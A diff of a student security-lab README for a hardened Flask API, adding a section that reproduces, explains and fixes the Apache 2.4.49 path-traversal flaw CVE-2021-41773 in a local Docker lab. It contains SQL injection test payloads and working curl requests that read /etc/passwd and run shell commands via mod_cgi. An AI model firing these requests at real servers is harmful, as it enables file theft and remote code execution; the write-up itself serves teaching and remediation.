@@ -2,13 +2,13 @@
 
 [![CI](https://github.com/Yute-Tjr/IS_Work1/actions/workflows/ci.yml/badge.svg)](https://github.com/Yute-Tjr/IS_Work1/actions/workflows/ci.yml)
 
-Laboratory Work 1, Information Security (HDU): *Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis*.
+Work 1: *Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis*.
 
 A small REST API written in **Python / Flask**. Authenticated users can publish and read short notes ("posts"). The project is built to defend against the OWASP Top 10 categories covered in the lab:
 
-- A01:2021 Broken Access Control
-- A03:2021 Injection (SQL injection and XSS)
-- A07:2021 Identification and Authentication Failures
+- A01:Broken Access Control
+- A03:Injection (SQL injection and XSS)
+- A07:Identification and Authentication Failures
 
 Every push and pull request runs the test suite, a SAST scan and an SCA scan in GitHub Actions.
 
@@ -145,7 +145,7 @@ curl -X DELETE http://127.0.0.1:8000/api/data/1 -H "Authorization: Bearer $TOKEN
 
 ## 4. Implemented security measures
 
-### 4.1 SQL injection protection (A03:2021)
+### 4.1 SQL injection protection
 
 The application never builds SQL from strings. Every query goes through the SQLAlchemy ORM, which sends user input to the database as **bound parameters** (a prepared statement with `?` placeholders). Input therefore can only be compared as data and can never change the structure of the query.
 
@@ -166,7 +166,7 @@ Tests in `tests/test_auth.py` and `tests/test_api.py` cover this:
 - Logins with payloads such as `' OR '1'='1` and `alice' --` return `401`.
 - Searches for `' OR 1=1 --` or `'; DROP TABLE posts; --` return 0 results, and the table is still intact afterwards.
 
-### 4.2 Cross-site scripting (XSS) protection (A03:2021)
+### 4.2 Cross-site scripting (XSS) protection
 
 - **Output encoding.** Every user-controlled string in a response (title, content, author) is HTML-escaped with `markupsafe.escape`, the escaping function built into Flask/Jinja2 (`Post.to_dict()` in `app/models.py`). Input is stored unchanged and encoded only on output, which is the approach recommended by the OWASP XSS Prevention Cheat Sheet. A client that inserts the value into a page shows `<script>` as text instead of running it:
 
@@ -181,7 +181,7 @@ Tests in `tests/test_auth.py` and `tests/test_api.py` cover this:
   - `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`.
   - `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer` and `Cache-Control: no-store`.
 
-### 4.3 Authentication (A07:2021)
+### 4.3 Authentication
 
 **Password storage**
 
@@ -212,16 +212,10 @@ Tests in `tests/test_auth.py` and `tests/test_api.py` cover this:
 - **No user enumeration.** A wrong username and a wrong password return the same message. For an unknown username a dummy bcrypt check still runs, so the response time is the same in both cases.
 - **Brute-force protection.** Flask-Limiter allows at most 5 login or register requests per minute per IP and answers further requests with `429`.
 
-### 4.4 Access control (A01:2021)
+### 4.4 Access control
 
 - Every `/api` route requires authentication (see the middleware above).
 - `DELETE /api/data/<id>` checks object ownership: `post.author_id` must equal the authenticated user's id, otherwise the API returns `403`. This prevents IDOR, where a user deletes someone else's post by guessing its id.
-
-### 4.5 Other hardening
-
-- Request bodies larger than 16 KB are rejected with `413`.
-- Errors are returned as JSON. Stack traces and internal details are logged on the server and never sent to the client.
-- Dependencies are fully pinned in `requirements.txt` and checked for known CVEs in CI.
 
 ## 5. CI/CD pipeline
 
@@ -233,22 +227,6 @@ Tests in `tests/test_auth.py` and `tests/test_api.py` cover this:
 | SAST (Bandit) | Static code analysis | [Bandit](https://bandit.readthedocs.io/) | an issue of medium or high severity is found in `app/` |
 | SCA (pip-audit) | Dependency vulnerabilities | [pip-audit](https://github.com/pypa/pip-audit) (PyPI / OSV advisory database) | any dependency has a known vulnerability |
 | SCA (Snyk) | Dependency vulnerabilities | [Snyk Open Source](https://snyk.io/product/open-source-security-management/) (Snyk vulnerability database) | any dependency has a known vulnerability |
-
-**Reports.** Each scan writes a summary to the run page, under *Summary*. It also uploads full reports as artifacts:
-
-- `bandit-report`: HTML and JSON
-- `pip-audit-report`: JSON
-- `snyk-report`: HTML, JSON and the CLI text output
-
-**Snyk setup.** The Snyk CLI needs a token from a (free) Snyk account.
-
-1. Sign up at <https://app.snyk.io>.
-2. Create a personal access token at <https://app.snyk.io/account/personal-access-tokens>.
-3. Add it in *Settings → Secrets and variables → Actions* as `SNYK_TOKEN`.
-
-Without the secret, the Snyk job is skipped with a warning and the other scanners still run. pip-audit is a second, independent SCA check: it uses the PyPI/OSV advisory data, while Snyk uses its own vulnerability database.
-
-**Bandit false positive.** Bandit's B106 check flagged `token_type="Bearer"` in `app/auth.py` as a possible hard-coded password. `"Bearer"` is the token type name defined in RFC 6750, not a secret. The line is marked `# nosec B106` with a comment that explains why.
 
 ### Scan results
 
@@ -289,10 +267,160 @@ Output of `./scripts/demo.sh` against the running server.
 
 ## 6. CVE analysis (Part B)
 
-> TODO: to be completed in Part B (Vulhub).
+A second, deliberately vulnerable target was reproduced and remediated with
+[Vulhub](https://github.com/vulhub/vulhub). All files are under
+[`cve-2021-41773/`](cve-2021-41773/): the runnable `vulnerable/` and `fix/`
+environments and the raw terminal logs in `evidence/`.
 
 ### 6.1 Selected vulnerability
+
+**CVE-2021-41773 — path traversal and file disclosure in Apache HTTP Server 2.4.49.**
+
+| Field | Value |
+|---|---|
+| Component | Apache HTTP Server (`httpd`) |
+| Affected version | **2.4.49** (regression introduced in this release) |
+| Weakness | CWE-22 — Path Traversal |
+| Impact | Arbitrary file read; **remote code execution** when `mod_cgi` is enabled |
+| CVSS 3.1 | 7.5 (High), effectively Critical once it escalates to RCE |
+| Fixed in | 2.4.51 (2.4.50 was an incomplete fix, bypassed by CVE-2021-42013) |
+
+A change to URL path normalization in 2.4.49 let an attacker smuggle a
+URL-encoded dot-segment (`%2e`) past the server's `../` filter. A request can
+then be mapped to files **outside** the document root. If those files are not
+protected by the default `Require all denied`, they are disclosed; if CGI is
+enabled, the traversal reaches `/bin/sh` and runs arbitrary commands.
+
+The Vulhub image (`vulnerable/Dockerfile`) deliberately combines the three
+conditions needed for a full compromise, confirmed live in the container
+(`evidence/rootcause-config.txt`):
+
+1. `FROM vulhub/httpd:2.4.49` — the vulnerable binary (the actual bug);
+2. `LoadModule cgid_module` + `ScriptAlias /cgi-bin/` — enables CGI → RCE;
+3. `<Directory />` changed from the secure default `Require all denied` to
+   **`Require all granted`** — removes the wall that protects everything outside
+   the web root.
+
 ### 6.2 Reproducing the vulnerability
+
+```bash
+cd cve-2021-41773/vulnerable
+docker compose up -d --build
+curl http://localhost:8081/          # -> <h1>It works!</h1>
+```
+
+**Baseline** — a plain, un-encoded traversal is correctly normalized and rejected,
+so the attacker has to defeat the `%2e` trick (`evidence/attack-01-baseline.txt`):
+
+```bash
+$ curl -s -o /dev/null -w 'HTTP %{http_code}\n' --path-as-is \
+    "http://localhost:8081/icons/../../../../etc/passwd"
+HTTP 400
+```
+
+**Exploit A — arbitrary file read.** The second dot of each `..` is written as
+`%2e`; `--path-as-is` keeps curl from normalizing the path itself
+(`evidence/attack-02-file-read.txt`):
+
+```bash
+$ curl -s --path-as-is \
+    "http://localhost:8081/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+```
+
+**Exploit B — remote code execution.** Because `mod_cgid` is loaded, the same
+traversal targets the `cgi-bin` alias and resolves to `/bin/sh`, which Apache
+runs as CGI with the POST body as its script (`evidence/attack-03-rce.txt`):
+
+```bash
+$ curl -s --data "echo;id" \
+    "http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+Further commands (`hostname`, `uname -a`) confirm full in-container execution as
+the `daemon` user. At this point the attacker has read-anything **and** command
+execution.
+
+![Reproduction on Apache 2.4.49 — Exploit A discloses /etc/passwd, Exploit B runs `id` via mod_cgi](docs/screenshots/cve-reproduce.png)
+
 ### 6.3 Root cause analysis
+
+**The bug is a code regression, not a misconfiguration.** Apache resolves a URL
+in two stages: it first **normalizes** the path (collapsing `.`/`..` so a URL
+cannot climb above the web root), then **decodes** percent-escapes and maps the
+result onto the filesystem. Security depends on normalization running on the
+*fully decoded* path, so an encoded `..` is caught just like a literal one.
+
+In the 2.4.49 rewrite of the path handler (`ap_normalize_path` in
+`server/util.c`) that ordering broke: the dot-segment remover only matched
+**literal** `.` characters, so a segment written as `.%2e` was not recognized as
+`..` and slipped through normalization untouched. When the path was later
+percent-decoded on the way to the filesystem, `%2e` became `.`, re-forming `../`
+— but now **after** the only check meant to stop it. So `/icons/.%2e/` behaves as
+`/icons/../`, and chaining several of them climbs to the filesystem root.
+
+Two configuration factors decide the severity (they are *not* the vulnerability,
+but the image enables them): `Require all granted` removes the authorization
+safety net that would otherwise refuse paths outside the web root, and
+`mod_cgi` escalates *read* into *execute*. The root cause itself is the
+normalization regression — improper input handling in the URL parser.
+
+> *Vulnerability vs. exploit:* the vulnerability is the normalization flaw in the
+> 2.4.49 code; the exploit is the concrete `curl` request with `%2e`-encoded
+> dot-segments that weaponizes it against this CGI-enabled deployment.
+
 ### 6.4 Applied fix
+
+The fix (`cve-2021-41773/fix/`) combines a root-cause change with defense in depth:
+
+| | Vulnerable | Fixed |
+|---|---|---|
+| Base image | `FROM vulhub/httpd:2.4.49` | `FROM httpd:2.4.54` |
+| `<Directory />` | `Require all granted` | stock default `Require all denied` |
+| CGI | enabled | still enabled (feature kept) |
+
+1. **Primary fix — upgrade Apache (removes the root cause).** 2.4.54 ships the
+   patched `ap_normalize_path`, so encoded dot-segments are normalized correctly
+   and can no longer escape the web root. 2.4.54 is pinned rather than 2.4.50
+   because **2.4.50's fix was incomplete** (double-encoding bypass, CVE-2021-42013);
+   2.4.51+ closes that too.
+2. **Defense in depth — keep `Require all denied` on `<Directory />`.** The
+   `perl` step that had loosened the root policy is simply removed, restoring
+   Apache's secure default, so even a future traversal bug would still be denied
+   outside the explicitly-granted web root.
+
+The two changes block the attack at two layers: the upgrade stops the malicious
+path from resolving outside the web root, and the restored default would deny it
+even if it did.
+
 ### 6.5 Verification of the fix
+
+Re-running the **exact same** exploits against `fix/`
+(`evidence/verify-01-exploits-blocked.txt`):
+
+| Test | Vulnerable (2.4.49) | Fixed (2.4.54) |
+|---|---|---|
+| A — file read `/icons/.%2e/.../etc/passwd` | `200 OK` + `/etc/passwd` (926 B) | **`400 Bad Request`**, 0 bytes |
+| B — RCE `/cgi-bin/.%2e/.../bin/sh` | `200 OK` + `uid=1(daemon)...` | **`400 Bad Request`**, no output |
+| Regression — `GET /` | `200` "It works!" | **`200` "It works!"** (unchanged) |
+
+```bash
+$ curl -s -o /dev/null -w 'HTTP %{http_code}  bytes=%{size_download}\n' --path-as-is \
+    "http://localhost:8081/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+HTTP 400  bytes=226          # error page, not /etc/passwd
+
+$ curl -s -o /dev/null -w 'HTTP %{http_code}\n' --data "echo;id" \
+    "http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+HTTP 400                     # no shell, no "uid=..."
+
+$ curl -s http://localhost:8081/
+<html><body><h1>It works!</h1></body></html>   # HTTP 200, functionality intact
+```
+
+The patched Apache returns **`400 Bad Request`** — it rejects the encoded
+dot-segments *during normalization*, before any filesystem lookup or
+authorization check. That is direct evidence the parser bug is gone (a config-only
+fix would instead produce `403 Forbidden`, i.e. the file still reachable but
+denied). The homepage still serves normally, so the **regression test passes**.
+
+![After the fix — both exploits return HTTP 400 and the homepage still works](docs/screenshots/cve-fixed.png)
